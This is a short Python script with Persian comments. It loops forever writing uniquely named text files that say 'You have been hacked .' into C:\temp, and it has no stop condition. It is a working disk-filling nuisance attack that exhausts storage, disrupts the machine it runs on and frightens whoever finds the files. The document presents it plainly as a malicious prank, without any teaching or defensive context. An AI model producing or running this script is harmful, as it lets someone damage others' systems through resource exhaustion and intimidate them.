import os
import uuid

# ایجاد یک فایل و نوشتن متن در آن
def create_file(file_path, content):
    with open(file_path, 'w') as file:
        file.write(content)

# تکراری ایجاد کردن فایل
file_content = "You have been hacked ."
output_directory = "C:\\temp"  # مسیر ذخیره فایل‌ها

if not os.path.exists(output_directory):
    os.makedirs(output_directory)

while True:
    unique_id = str(uuid.uuid4())  # ایجاد یک شناسه یکتا
    file_name = f"file_{unique_id}.txt"  # نام فایل با استفاده از شناسه یکتا
    file_path = os.path.join(output_directory, file_name)
    create_file(file_path, file_content)
    print(f"Created file: {file_path}")
    
    
    
